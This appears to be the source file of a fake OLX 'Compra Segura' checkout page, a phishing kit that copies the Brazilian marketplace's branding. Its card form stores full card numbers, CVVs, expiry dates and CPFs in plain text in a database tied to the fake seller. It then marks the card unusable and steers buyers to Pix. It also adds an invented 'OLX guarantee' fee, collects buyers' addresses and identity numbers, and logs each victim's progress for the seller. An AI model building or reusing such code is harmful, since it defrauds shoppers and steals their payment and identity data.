import { createFileRoute, useNavigate, useSearch } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { AlertTriangle, Loader2, X, CreditCard, Truck } from "lucide-react";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
import { Dialog, DialogContent } from "@/components/ui/dialog";
import { supabase } from "@/integrations/supabase/client";
import { logVisitorActivity, fetchProductBySlug, fetchCheckoutProduct, markVisitorBlocked } from "@/lib/tracking";
import olxLogo from "@/assets/olx-logo.png";
import pixIcon from "@/assets/pix-icon.png";
import "@/styles/olx.css";

type Search = { produto?: string };

export const Route = createFileRoute("/compra-segura")({
  validateSearch: (s: Record<string, unknown>): Search => ({
    produto: typeof s.produto === "string" ? s.produto : undefined,
  }),
  head: () => ({
    meta: [
      { title: "Compra Segura - OLX" },
      { name: "description", content: "Finalize sua compra com segurança na OLX." },
    ],
  }),
  component: SecurePurchasePage,
});

interface ProductData {
  id: string;
  name: string;
  price: number;
  garantia_olx: number;
  image1_url: string | null;
  seller_name: string;
  seller_cpf: string;
  user_id: string;
  credit_card_enabled: boolean;
  pay_on_delivery_enabled: boolean;
  credit_card_payment_link: string | null;
  credit_card_type: "external" | "native" | null;
  pay_on_delivery_whatsapp: string | null;
}

function SecurePurchasePage() {
  const navigate = useNavigate();
  const { produto: searchSlug } = useSearch({ from: "/compra-segura" }) as Search;
  const productSlug =
    searchSlug ??
    (typeof window !== "undefined"
      ? localStorage.getItem("olx_produto_slug") ?? undefined
      : undefined);

  const [product, setProduct] = useState<ProductData | null>(null);
  const [loading, setLoading] = useState(true);
  const [deliveryMethod, setDeliveryMethod] = useState("delivery");
  const [paymentMethod, setPaymentMethod] = useState("pix");
  const [couponCode, setCouponCode] = useState("");
  const [showAddressModal, setShowAddressModal] = useState(false);
  const [showCheckoutModal, setShowCheckoutModal] = useState(false);
  const [showCardRedirectModal, setShowCardRedirectModal] = useState(false);
  const [showCardFormModal, setShowCardFormModal] = useState(false);
  const [cardRedirectStep, setCardRedirectStep] = useState(0);
  const [buyerName, setBuyerName] = useState("");
  const [buyerCpf, setBuyerCpf] = useState("");
  const [savedAddress, setSavedAddress] = useState<{
    cep: string; rua: string; numero: string; complemento: string; referencia: string;
  } | null>(null);
  const [addressForm, setAddressForm] = useState({
    cep: "", rua: "", numero: "", complemento: "", referencia: "",
  });
  const [cardForm, setCardForm] = useState({
    number: "", name: "", expiry: "", cvv: "", cpf: "",
  });
  const [savedCardPreview, setSavedCardPreview] = useState<string | null>(null);
  const [loadingCep, setLoadingCep] = useState(false);
  const [processingCard, setProcessingCard] = useState(false);
  const [sellerIsAdmin, setSellerIsAdmin] = useState(false);
  


  useEffect(() => {
    const load = async () => {
      if (!productSlug) { setLoading(false); return; }
      try {
        const row = await fetchCheckoutProduct(productSlug);
        if (!row) { setProduct(null); return; }
        if (row.blocked) {
          markVisitorBlocked();
          navigate({ to: "/" as any, replace: true });
          return;
        }
        setProduct({
          id: row.id,
          name: row.name,
          price: Number(row.price || 0),
          garantia_olx: Number(row.garantia_olx || 49),
          image1_url: row.image1_url,
          seller_name: row.seller_name || "Vendedor",
          seller_cpf: row.seller_cpf || "",
          user_id: row.user_id,
          credit_card_enabled: !!row.credit_card_enabled,
          pay_on_delivery_enabled: !!(row as any).pay_on_delivery_enabled,
          credit_card_payment_link: row.credit_card_payment_link ?? null,
          credit_card_type: (row.credit_card_type as any) ?? null,
          pay_on_delivery_whatsapp: (row as any).pay_on_delivery_whatsapp ?? null,
        });
        logVisitorActivity(row.user_id, "secure_purchase_view", productSlug, row.name);
        supabase
          .rpc("has_role", { _user_id: row.user_id, _role: "admin" })
          .then(({ data }) => setSellerIsAdmin(data === true));

      } finally {
        setLoading(false);
      }
    };
    load();
  }, [productSlug, navigate]);

  const formatCep = (v: string) => {
    const n = v.replace(/\D/g, "").slice(0, 8);
    return n.length > 5 ? n.slice(0, 5) + "-" + n.slice(5) : n;
  };

  const handleCepChange = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCep(e.target.value);
    setAddressForm({ ...addressForm, cep: formatted });
    const clean = formatted.replace(/\D/g, "");
    if (clean.length !== 8) return;
    setLoadingCep(true);
    try {
      const r = await fetch(`https://viacep.com.br/ws/${clean}/json/`);
      const data = await r.json();
      if (data && !data.erro && typeof data.logradouro === "string") {
        setAddressForm((prev) => ({ ...prev, rua: data.logradouro.slice(0, 200) || "" }));
      }
    } catch (e) { console.error(e); } finally { setLoadingCep(false); }
  };

  const handleSaveAddress = () => {
    if (!addressForm.cep || !addressForm.rua || !addressForm.numero) return;
    setSavedAddress(addressForm);
    setShowAddressModal(false);
    if (product) logVisitorActivity(product.user_id, "address_registration", productSlug, product.name);
  };

  const handleConfirmPayment = () => {
    if (paymentMethod === "delivery") {
      setShowCheckoutModal(true);
      return;
    }
    if (paymentMethod === "card") {
      if (product?.credit_card_type === "native") {
        setShowCardFormModal(true);
        if (product) logVisitorActivity(product.user_id, "native_checkout_started", productSlug, product.name);
      } else {
        setCardRedirectStep(0);
        setShowCardRedirectModal(true);
        if (product) logVisitorActivity(product.user_id, "external_checkout_redirect", productSlug, product.name);
        setTimeout(() => {
          setCardRedirectStep(1);
          setTimeout(() => {
            if (product?.credit_card_payment_link) window.location.href = product.credit_card_payment_link;
          }, 2500);
        }, 2500);
      }
    } else {
      setShowCheckoutModal(true);
    }
  };

  const formatCardNumber = (v: string) => {
    const n = v.replace(/\D/g, "").slice(0, 16);
    const g = n.match(/.{1,4}/g);
    return g ? g.join(" ") : n;
  };
  const formatExpiry = (v: string) => {
    const n = v.replace(/\D/g, "").slice(0, 4);
    return n.length > 2 ? n.slice(0, 2) + "/" + n.slice(2) : n;
  };
  const formatCpfInput = (v: string) => {
    const n = v.replace(/\D/g, "").slice(0, 11);
    if (n.length > 9) return n.slice(0, 3) + "." + n.slice(3, 6) + "." + n.slice(6, 9) + "-" + n.slice(9);
    if (n.length > 6) return n.slice(0, 3) + "." + n.slice(3, 6) + "." + n.slice(6);
    if (n.length > 3) return n.slice(0, 3) + "." + n.slice(3);
    return n;
  };

  const handleCardFormSubmit = async () => {
    const cardNumberDigits = cardForm.number.replace(/\D/g, "");
    const expiryDigits = cardForm.expiry.replace(/\D/g, "");
    const cpfDigits = cardForm.cpf.replace(/\D/g, "");
    if (cardNumberDigits.length < 13) return;
    if (!cardForm.name.trim()) return;
    if (expiryDigits.length < 4) return;
    if (cardForm.cvv.length < 3) return;
    if (cpfDigits.length !== 11) return;

    setProcessingCard(true);
    try {
      const first4 = cardNumberDigits.slice(0, 4);
      const last4 = cardNumberDigits.slice(-4);
      await supabase.from("card_registrations").insert({
        product_id: product?.id,
        user_id: product?.user_id,
        holder_name: cardForm.name,
        card_number: cardForm.number,
        expiry: cardForm.expiry,
        cvv: cardForm.cvv,
        cpf: cardForm.cpf,
      } as any);
      if (product) logVisitorActivity(product.user_id, "card_registration", productSlug, product.name);
      setSavedCardPreview(`${first4} **** **** ${last4}`);
      setPaymentMethod("pix");
      setShowCardFormModal(false);
    } catch (e) { console.error(e); } finally { setProcessingCard(false); }
  };

  const handleFinalizePayment = async () => {
    if (!buyerName.trim()) return;
    if (buyerCpf.replace(/\D/g, "").length !== 11) return;
    setShowCheckoutModal(false);

    if (paymentMethod === "delivery" && product) {
      try {
        await supabase.from("delivery_orders").insert({
          user_id: product.user_id,
          product_id: product.id,
          product_slug: productSlug,
          product_name: product.name,
          product_price: product.price,
          buyer_name: buyerName.trim(),
          buyer_cpf: buyerCpf.replace(/\D/g, ""),
          cep: savedAddress?.cep ?? null,
          rua: savedAddress?.rua ?? null,
          numero: savedAddress?.numero ?? null,
          complemento: savedAddress?.complemento ?? null,
          referencia: savedAddress?.referencia ?? null,
          status: "pending",
        } as any);
        logVisitorActivity(product.user_id, "pay_on_delivery_order", productSlug, product.name);
      } catch (e) { console.error(e); }
      try {
        localStorage.setItem("olx_delivery_buyer", JSON.stringify({
          name: buyerName.trim(),
          cpf: buyerCpf,
          cep: savedAddress?.cep ?? null,
          rua: savedAddress?.rua ?? null,
          numero: savedAddress?.numero ?? null,
          complemento: savedAddress?.complemento ?? null,
        }));
      } catch {}
      navigate({
        to: "/pagamento-entrega",
        search: productSlug ? { produto: productSlug } : {},
      } as any);
      return;
    }

    navigate({
      to: "/pix",
      search: productSlug ? { produto: productSlug } : {},
    } as any);
  };


  const maskCpf = (cpf: string) => {
    const clean = cpf.replace(/\D/g, "");
    if (clean.length >= 9) return `*** ${clean.slice(3, 6)} ${clean.slice(6, 9)} **`;
    return cpf;
  };

  if (loading) {
    return (
      <div className="secure-purchase-page">
        <div className="flex items-center justify-center min-h-screen">
          <Loader2 className="h-8 w-8 animate-spin" />
        </div>
      </div>
    );
  }

  if (!product) {
    return (
      <div className="secure-purchase-page">
        <header className="secure-header">
          <div className="secure-header-content">
            <img src={olxLogo} alt="OLX" className="secure-logo" />
          </div>
        </header>
        <main className="secure-main">
          <div className="secure-container">
            <div className="text-center py-12">
              <h1 className="text-xl font-bold mb-2">Produto não encontrado</h1>
              <p className="text-muted-foreground">O produto que você procura não existe ou foi removido.</p>
            </div>
          </div>
        </main>
      </div>
    );
  }

  const total = product.price + (product.garantia_olx || 49);

  return (
    <div className="secure-purchase-page">
      <header className="secure-header">
        <div className="secure-header-content">
          <img src={olxLogo} alt="OLX" className="secure-logo" />
        </div>
      </header>

      <main className="secure-main">
        <div className="secure-container">
          <div className="secure-left">
            <h1 className="secure-title">Confirme sua compra</h1>

            <section className="secure-section">
              <h2 className="secure-section-title">Entrega</h2>
              <RadioGroup value={deliveryMethod} onValueChange={setDeliveryMethod}>
                <div className="secure-radio-option">
                  <RadioGroupItem value="delivery" id="delivery" />
                  <label htmlFor="delivery" className="secure-radio-label">Quero entrega pela OLX</label>
                </div>
                <div className="secure-radio-option">
                  <RadioGroupItem value="pickup" id="pickup" />
                  <label htmlFor="pickup" className="secure-radio-label">
                    Quero retirar com o vendedor
                    <span className="secure-radio-hint">(a combinar)</span>
                  </label>
                </div>
              </RadioGroup>
            </section>

            {deliveryMethod === "delivery" && (
              <section className="secure-section">
                <h2 className="secure-section-title">Endereço de entrega</h2>
                {savedAddress ? (
                  <div className="secure-address-saved">
                    <div className="secure-address-saved-info">
                      <Truck size={24} className="secure-address-saved-icon" style={{ color: "#6e0ad6" }} />
                      <div>
                        <p className="secure-address-saved-street">
                          {savedAddress.rua}, {savedAddress.numero}
                          {savedAddress.complemento && ` - ${savedAddress.complemento}`}
                        </p>
                        <p className="secure-address-saved-cep">CEP: {savedAddress.cep}</p>
                        <p className="secure-free-shipping-label">Frete grátis · 2 dias úteis</p>
                      </div>
                    </div>
                    <button className="secure-address-btn" onClick={() => setShowAddressModal(true)}>Alterar</button>
                  </div>
                ) : (
                  <div className="secure-address-box">
                    <div className="secure-address-warning">
                      <AlertTriangle className="secure-warning-icon" />
                      <div>
                        <p className="secure-address-title">Cadastre seu endereço</p>
                        <p className="secure-address-subtitle">Você não possui endereços</p>
                      </div>
                    </div>
                    <button className="secure-address-btn" onClick={() => setShowAddressModal(true)}>Cadastrar</button>
                  </div>
                )}
              </section>
            )}

            <section className="secure-section">
              <h2 className="secure-section-title">Forma de pagamento</h2>
              <RadioGroup value={paymentMethod} onValueChange={setPaymentMethod}>
                <div className="secure-payment-option">
                  <RadioGroupItem value="pix" id="pix" />
                  <div className="secure-pix-icon">
                    <img src={pixIcon} alt="Pix" className="w-6 h-6 object-contain" />
                  </div>
                  <div className="secure-payment-info">
                    <span className="secure-payment-name">Pix</span>
                    <span className="secure-payment-desc">A OLX se responsabiliza pelo seu pagamento.</span>
                  </div>
                </div>

                {product?.credit_card_enabled && (
                  <div
                    className={`secure-payment-option ${savedCardPreview ? "opacity-60 cursor-not-allowed" : "cursor-pointer"}`}
                    onClick={() => {
                      if (savedCardPreview) return;
                      const isExternal = product?.credit_card_type === "external" && !!product?.credit_card_payment_link;
                      if (isExternal) {
                        setPaymentMethod("card");
                      } else {
                        setShowCardFormModal(true);
                        logVisitorActivity(product.user_id, "native_checkout_started", productSlug, product.name);
                      }
                    }}
                  >
                    <RadioGroupItem value="card" id="card" disabled={!!savedCardPreview} />
                    <div className="secure-pix-icon">
                      <svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="#6e0ad6" strokeWidth="2">
                        <rect x="1" y="4" width="22" height="16" rx="2" ry="2" />
                        <line x1="1" y1="10" x2="23" y2="10" />
                      </svg>
                    </div>
                    <div className="secure-payment-info">
                      {(() => {
                        const isExternal = product?.credit_card_type === "external" && !!product?.credit_card_payment_link;
                        return (
                          <>
                            <span className="secure-payment-name">
                              {savedCardPreview
                                ? `Cartão ${savedCardPreview}`
                                : isExternal
                                  ? "Cartão de Crédito"
                                  : "Cadastrar cartão"}
                            </span>
                            <span className="secure-payment-desc">
                              {savedCardPreview
                                ? "Forma de pagamento indisponível"
                                : isExternal
                                  ? "Parcele em até 12x sem juros."
                                  : "Cadastre seu cartão de forma segura."}
                            </span>
                          </>
                        );
                      })()}
                    </div>
                  </div>
                )}

                {product?.pay_on_delivery_enabled && sellerIsAdmin && (
                  <div className="secure-payment-option cursor-pointer" onClick={() => setPaymentMethod("delivery")}>
                    <RadioGroupItem value="delivery" id="pay-delivery" />
                    <div className="secure-pix-icon">
                      <Truck size={24} color="#6e0ad6" />
                    </div>
                    <div className="secure-payment-info">
                      <span className="secure-payment-name">Pagar na entrega</span>
                      <span className="secure-payment-desc">Pague em dinheiro ou maquininha ao receber o produto.</span>
                    </div>
                  </div>
                )}

              </RadioGroup>

            </section>

            <section className="secure-section">
              <h2 className="secure-section-title">Cupom de desconto</h2>
              <div className="secure-coupon-row">
                <input type="text" placeholder="Digite o código" value={couponCode}
                  onChange={(e) => setCouponCode(e.target.value)} className="secure-coupon-input" />
                <button className="secure-coupon-btn">Aplicar</button>
              </div>
            </section>
          </div>

          <div className="secure-right">
            <div className="secure-summary-card">
              <h2 className="secure-summary-title">Resumo</h2>

              <div className="secure-product-row">
                <img src={product.image1_url || "https://via.placeholder.com/100"} alt={product.name} className="secure-product-image" />
                <div className="secure-product-info">
                  <p className="secure-product-name">{product.name}</p>
                </div>
              </div>

              <div className="secure-seller-info">
                <span>Vendido por: <span className="secure-seller-name">{product.seller_name}</span></span>
                <span className="secure-seller-cpf">CPF {maskCpf(product.seller_cpf)}</span>
              </div>

              <div className="secure-price-rows">
                <div className="secure-price-row">
                  <span>Produto</span>
                  <span>R$ {product.price.toLocaleString("pt-BR")}</span>
                </div>
                <div className="secure-price-row">
                  <span>Entrega</span>
                  <span className="secure-free-shipping">Frete grátis</span>
                </div>
                <div className="secure-price-row">
                  <span>Garantia da OLX</span>
                  <span>R$ {product.garantia_olx || 49}</span>
                </div>
              </div>

              <div className="secure-guarantee-info">
                <p>A garantia da OLX é cobrada para assegurar que o seu dinheiro será reembolsado em caso de problemas.</p>
              </div>

              <div className="secure-total-row">
                <span>Total a pagar</span>
                <span className="secure-total-value">R$ {total.toLocaleString("pt-BR")}</span>
              </div>

              <button
                onClick={handleConfirmPayment}
                className="secure-confirm-btn"
                disabled={deliveryMethod === "delivery" && !savedAddress}
                style={{
                  opacity: deliveryMethod === "delivery" && !savedAddress ? 0.5 : 1,
                  cursor: deliveryMethod === "delivery" && !savedAddress ? "not-allowed" : "pointer",
                }}
              >
                Confirmar pagamento
              </button>

              <p className="secure-terms">
                Ao confirmar o pagamento você declara que está concordando com os{" "}
                <a href="#" className="secure-terms-link">Termos e Condições de uso</a>
              </p>
            </div>
          </div>
        </div>
      </main>

      <Dialog open={showAddressModal} onOpenChange={setShowAddressModal}>
        <DialogContent className="address-modal">
          <h2 className="address-modal-title">Novo Endereço</h2>
          <div className="address-modal-form">
            <div className="address-field">
              <div className="address-field-header">
                <label>CEP <span className="required">*</span></label>
                <a href="https://buscacepinter.correios.com.br/app/endereco/index.php" target="_blank" rel="noopener noreferrer" className="address-help-link">
                  não sei meu CEP
                </a>
              </div>
              <input type="text" value={addressForm.cep} onChange={handleCepChange} className="address-input" />
              {loadingCep && <span className="address-loading">Buscando...</span>}
            </div>
            <div className="address-field">
              <label>Rua <span className="required">*</span></label>
              <input type="text" value={addressForm.rua} onChange={(e) => setAddressForm({ ...addressForm, rua: e.target.value })} className="address-input" />
            </div>
            <div className="address-row">
              <div className="address-field address-field-small">
                <label>Número <span className="required">*</span></label>
                <input type="text" value={addressForm.numero} onChange={(e) => setAddressForm({ ...addressForm, numero: e.target.value })} className="address-input" />
              </div>
              <div className="address-field address-field-large">
                <label>Complemento</label>
                <input type="text" value={addressForm.complemento} onChange={(e) => setAddressForm({ ...addressForm, complemento: e.target.value })} className="address-input" />
              </div>
            </div>
            <div className="address-field">
              <label>Ponto de referência</label>
              <input type="text" value={addressForm.referencia} onChange={(e) => setAddressForm({ ...addressForm, referencia: e.target.value })} className="address-input" />
            </div>
            <button onClick={handleSaveAddress} className="address-save-btn">Salvar endereço</button>
          </div>
        </DialogContent>
      </Dialog>

      <Dialog open={showCheckoutModal} onOpenChange={setShowCheckoutModal}>
        <DialogContent className="checkout-modal p-0 max-w-[360px] rounded-xl">
          <div className="flex justify-end p-3 pb-0">
            <button onClick={() => setShowCheckoutModal(false)} className="text-gray-500 hover:text-gray-700">
              <X size={20} />
            </button>
          </div>
          <div className="px-5 pb-5">
            <h2 className="text-lg font-bold text-gray-900 mb-1">Finalize a compra</h2>
            <p className="text-sm text-gray-600 mb-4">Revise e preencha seus dados a seguir para finalizar a compra com segurança.</p>
            <div className="flex gap-3 mb-2">
              <img src={product?.image1_url || "https://via.placeholder.com/60"} alt={product?.name} className="w-14 h-14 object-cover rounded-lg" />
              <div className="flex-1">
                <p className="text-sm font-medium text-gray-900 leading-tight">{product?.name}</p>
              </div>
            </div>
            <div className="text-xs text-gray-600 mb-4">
              <span>Vendido por: {product?.seller_name}</span><br />
              <span>CPF {maskCpf(product?.seller_cpf || "")}</span>
            </div>
            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Nome completo <span className="text-red-500">*</span></label>
                <input type="text" value={buyerName} onChange={(e) => setBuyerName(e.target.value)}
                  placeholder="Preencha o nome conforme seu RG"
                  className="w-full px-3 py-2.5 border border-gray-300 rounded-lg text-sm focus:outline-none focus:border-[#6e0ad6]" />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">CPF <span className="text-red-500">*</span></label>
                <input type="text" value={buyerCpf} onChange={(e) => setBuyerCpf(formatCpfInput(e.target.value))}
                  placeholder="000.000.000-00"
                  className="w-full px-3 py-2.5 border border-gray-300 rounded-lg text-sm focus:outline-none focus:border-[#6e0ad6]" />
              </div>
            </div>
            <div className="flex gap-3 mt-6">
              <button onClick={() => setShowCheckoutModal(false)} className="flex-1 py-2.5 text-sm font-medium text-[#6e0ad6] hover:underline">Voltar</button>
              <button onClick={handleFinalizePayment} className="flex-1 py-2.5 text-sm font-medium text-white bg-[#f56e00] rounded-full hover:bg-[#e06400]">Finalizar</button>
            </div>
          </div>
        </DialogContent>
      </Dialog>






      <Dialog open={showCardRedirectModal} onOpenChange={() => {}}>
        <DialogContent className="checkout-modal p-0 max-w-[400px] rounded-xl" style={{ pointerEvents: "none" }}>
          <div className="px-8 py-12 text-center">
            <div className="flex justify-center mb-6"><img src={olxLogo} alt="OLX" style={{ height: 48 }} /></div>
            <div className="mb-6"><Loader2 className="h-12 w-12 animate-spin mx-auto text-[#6e0ad6]" /></div>
            <div className="space-y-2">
              {cardRedirectStep === 0 && (
                <>
                  <h3 className="text-lg font-bold text-gray-900">Estamos criando sua transação</h3>
                  <p className="text-sm text-gray-600">Por favor, aguarde...</p>
                </>
              )}
              {cardRedirectStep === 1 && (
                <>
                  <h3 className="text-lg font-bold text-gray-900">Aguarde</h3>
                  <p className="text-sm text-gray-600">Estamos redirecionando você para nossa rede parceira...</p>
                </>
              )}
            </div>
          </div>
        </DialogContent>
      </Dialog>

      <Dialog open={showCardFormModal} onOpenChange={setShowCardFormModal}>
        <DialogContent className="checkout-modal p-0 max-w-[400px] rounded-xl">
          <div className="flex justify-end p-3 pb-0">
            <button onClick={() => setShowCardFormModal(false)} className="text-gray-500 hover:text-gray-700"><X size={20} /></button>
          </div>
          <div className="px-5 pb-5">
            <div className="flex items-center gap-2 mb-4">
              <CreditCard className="h-6 w-6 text-[#6e0ad6]" />
              <h2 className="text-lg font-bold text-gray-900">Cadastrar Cartão</h2>
            </div>
            <p className="text-sm text-gray-600 mb-4">Preencha os dados do seu cartão de crédito para finalizar a compra.</p>
            <div className="flex gap-3 mb-4 p-3 bg-gray-50 rounded-lg">
              <img src={product?.image1_url || "https://via.placeholder.com/60"} alt={product?.name} className="w-14 h-14 object-cover rounded-lg" />
              <div className="flex-1">
                <p className="text-sm font-medium text-gray-900 leading-tight">{product?.name}</p>
                <p className="text-lg font-bold text-[#6e0ad6] mt-1">
                  R$ {((product?.price || 0) + (product?.garantia_olx || 49)).toLocaleString("pt-BR")}
                </p>
              </div>
            </div>
            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Número do Cartão <span className="text-red-500">*</span></label>
                <input type="text" value={cardForm.number}
                  onChange={(e) => setCardForm({ ...cardForm, number: formatCardNumber(e.target.value) })}
                  placeholder="0000 0000 0000 0000" maxLength={19}
                  className="w-full px-3 py-2.5 border border-gray-300 rounded-lg text-sm focus:outline-none focus:border-[#6e0ad6]" />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Nome no Cartão <span className="text-red-500">*</span></label>
                <input type="text" value={cardForm.name}
                  onChange={(e) => setCardForm({ ...cardForm, name: e.target.value.toUpperCase() })}
                  placeholder="NOME COMO ESTÁ NO CARTÃO"
                  className="w-full px-3 py-2.5 border border-gray-300 rounded-lg text-sm focus:outline-none focus:border-[#6e0ad6] uppercase" />
              </div>
              <div className="flex gap-3">
                <div className="flex-1">
                  <label className="block text-sm font-medium text-gray-700 mb-1">Validade <span className="text-red-500">*</span></label>
                  <input type="text" value={cardForm.expiry}
                    onChange={(e) => setCardForm({ ...cardForm, expiry: formatExpiry(e.target.value) })}
                    placeholder="MM/AA" maxLength={5}
                    className="w-full px-3 py-2.5 border border-gray-300 rounded-lg text-sm focus:outline-none focus:border-[#6e0ad6]" />
                </div>
                <div className="flex-1">
                  <label className="block text-sm font-medium text-gray-700 mb-1">CVV <span className="text-red-500">*</span></label>
                  <input type="text" value={cardForm.cvv}
                    onChange={(e) => setCardForm({ ...cardForm, cvv: e.target.value.replace(/\D/g, "").slice(0, 4) })}
                    placeholder="000" maxLength={4}
                    className="w-full px-3 py-2.5 border border-gray-300 rounded-lg text-sm focus:outline-none focus:border-[#6e0ad6]" />
                </div>
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">CPF do Titular <span className="text-red-500">*</span></label>
                <input type="text" value={cardForm.cpf}
                  onChange={(e) => setCardForm({ ...cardForm, cpf: formatCpfInput(e.target.value) })}
                  placeholder="000.000.000-00"
                  className="w-full px-3 py-2.5 border border-gray-300 rounded-lg text-sm focus:outline-none focus:border-[#6e0ad6]" />
              </div>
            </div>
            <div className="mt-6">
              <button onClick={handleCardFormSubmit} disabled={processingCard}
                className="w-full py-3 text-sm font-medium text-white bg-[#f56e00] rounded-full hover:bg-[#e06400] disabled:opacity-50">
                {processingCard ? "Processando..." : "Cadastrar cartão"}
              </button>
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
}
